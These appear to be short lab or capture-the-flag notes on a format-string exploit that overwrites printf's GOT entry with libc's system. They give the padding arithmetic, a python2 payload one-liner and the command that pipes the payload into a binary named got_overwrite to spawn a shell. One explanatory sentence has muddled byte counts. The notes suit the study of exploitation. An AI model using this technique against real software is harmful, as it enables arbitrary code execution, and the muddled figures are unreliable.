# Need to overwrite 0x0804c00c (GOT.printf) with 0xf7db64c0 (LIBC.system)

# It means writing 0xf7db (63451) @ 0x0804c00c + 2 = 0x0804c00e (high order)
# and 0x64c0 (25792) @ 0x0804c00c (low order)

# Now, we have to figure out the value to set for the padding. Here is the formula :
[The value we want] - [The bytes alredy wrote] = [The value to set].

# Let’s start with the low order bytes :
It’ll will be 25792 - 8 = 25784, because we already wrote 8 bytes (the two 4 bytes addresses).

# Then, the high order bytes :
It’ll will be 63451 - 25792 = 37659, because we already wrote 25784 bytes (the two 4 bytes addresses and 61496 bytes from the previous writing).

# Now we can construct the exploit (note our write offset is %4 so we want [%4,%5] as offsets instead of [%7,%8]) :


python2 -c 'print "\x0c\xc0\x04\x08\x0e\xc0\x04\x08%25784x%4$hn%37659x%5$hn"' > payload

====IMPORTANT

After calling system, need to use command below to spawn shell bcs its an interactive system.

(cat payload ; cat) | ./got_overwrite


